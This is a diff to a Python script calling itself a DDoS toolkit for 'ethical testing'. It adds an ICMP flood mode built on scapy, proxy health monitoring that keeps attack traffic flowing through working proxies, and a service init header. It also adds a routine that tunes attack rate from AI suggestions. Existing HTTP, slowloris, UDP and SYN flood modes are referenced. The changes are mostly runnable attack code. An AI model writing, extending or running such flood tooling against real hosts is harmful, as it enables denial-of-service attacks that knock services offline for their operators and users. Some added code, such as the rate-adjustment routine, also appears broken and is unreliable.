@@ -1,6 +1,28 @@
 #!/usr/bin/env python3
+### BEGIN INIT INFO
+# Provides:          ddos_toolkit
+# Required-Start:    $network $remote_fs
+# Required-Stop:     
+# Should-Start:      
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: DDoS attack toolkit for cybersecurity testing
+### END INIT INFO
+# DDoS Toolkit: Ethical cybersecurity testing tool.
+#
+# This toolkit is designed to simulate Distributed Denial of Service (DDoS)
+# attacks in controlled environments for testing and educational purposes.
+#
+# License: MIT License
+# Full license: https://opensource.org/licenses/MIT
+#
+# Disclaimer: This script is distributed in the hope it will be useful but
+# comes with no warranty of any kind. It is intended strictly for legal
+# and ethical use in authorized testing scenarios.
+#
 # -*- coding: utf-8 -*-
-# Author: LIONMAD
+# Author:
+# - LIONMAD <https://github.com/Midohajhouj>
 
 # Standard Libraries
 import aiohttp
@@ -99,7 +121,7 @@ def parse_args():
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
     parser.add_argument("--results", help="File to save results (JSON)")
     parser.add_argument("--rate-limit", type=int, default=100, help="Rate limit for requests per second")
-    parser.add_argument("--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood"], default="http-flood", help="Type of attack to perform")
+    parser.add_argument("--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood", "icmp-flood"], default="http-flood", help="Type of attack to perform")
     parser.add_argument("--proxy-auth", help="Proxy authentication (username:password)")
     parser.add_argument("--retry", type=int, default=3, help="Number of retries for failed requests")
     parser.add_argument("--user-agents", help="File containing custom user-agent strings")
@@ -140,6 +162,24 @@ async def check_proxy(proxy: str):
                 return response.status == 200
     except Exception:
         return False
+
+async def check_proxy_health(proxy: str):
+    """Check the health of a proxy."""
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
+                return response.status == 200
+    except Exception:
+        return False
+
+async def monitor_proxy_health(proxies):
+    """Continuously monitor the health of proxies."""
+    while True:
+        for proxy in proxies:
+            if not await check_proxy_health(proxy):
+                proxies.remove(proxy)
+                print(f"Removed unhealthy proxy: {proxy}")
+        await asyncio.sleep(60)  # Check every 60 seconds
 
 def generate_payload(payload_type: str):
     """Generate a payload for HTTP requests."""
@@ -245,6 +285,20 @@ def syn_flood(target_ip, target_port, duration):
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
     print("SYN flood attack completed.")
 
+def icmp_flood(target_ip, duration):
+    """Perform an ICMP flood attack using scapy."""
+    print(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            # Craft an ICMP packet using scapy
+            packet = scapy.IP(dst=target_ip) / scapy.ICMP()
+            scapy.send(packet, verbose=False)
+        except Exception as e:
+            print(f"Error during ICMP flood: {e}")
+        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
+    print("ICMP flood attack completed.")
+
 def display_status(stop_event: threading.Event, duration: int, results_file=None):
     """Display the status of the load test."""
     start_time = time.time()
@@ -329,12 +383,16 @@ def get_ai_suggestion():
         logging.error(f"Failed to get AI suggestion: {e}")
         return "Unable to fetch AI suggestion. Please check your OpenAI API key and network connection."
 
-def execute_custom_command():
-    """Execute a custom command with AI-powered suggestions."""
+def adjust_parameters_based_on_feedback():
+    """Adjust attack parameters based on AI feedback."""
     suggestion = get_ai_suggestion()
     print(f"{YELLOW}AI-Powered Suggestion: {suggestion}{RESET}")
-    # Here you can add logic to execute the suggestion or modify the attack parameters
-    # For example, you could adjust the number of threads, pause time, or attack mode based on the suggestion.
+    # Example: Adjust rate limit based on suggestion
+    if "increase rate limit" in suggestion.lower():
+        args.rate_limit += 10
+    elif "decrease rate limit" in suggestion.lower():
+        args.rate_limit -= 10
+    print(f"Adjusted rate limit to {args.rate_limit}")
 
 async def main():
     """Main function to run the load test."""
@@ -349,6 +407,8 @@ async def main():
     proxies = load_proxies(args.proxies) if args.proxies else []
     if proxies:
         proxies = validate_proxies(proxies)
+        # Start proxy health monitoring in a separate thread
+        asyncio.create_task(monitor_proxy_health(proxies))
 
     headers = json.loads(args.headers) if args.headers else None
 
@@ -365,6 +425,9 @@ async def main():
         target_ip = await resolve_target(target)
         target_port = 80  # Default port for SYN flood
         threading.Thread(target=syn_flood, args=(target_ip, target_port, args.duration)).start()
+    elif args.attack_mode == "icmp-flood":
+        target_ip = await resolve_target(target)
+        threading.Thread(target=icmp_flood, args=(target_ip, args.duration)).start()
     else:
         for _ in range(args.threads):
             task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
@@ -387,6 +450,8 @@ async def main():
     if args.results:
         print(f"{GREEN}Results saved to {args.results}{RESET}")
 
+    # Adjust parameters based on AI feedback
+    adjust_parameters_based_on_feedback()
 
 if __name__ == "__main__":
     # Handle signals for graceful exit
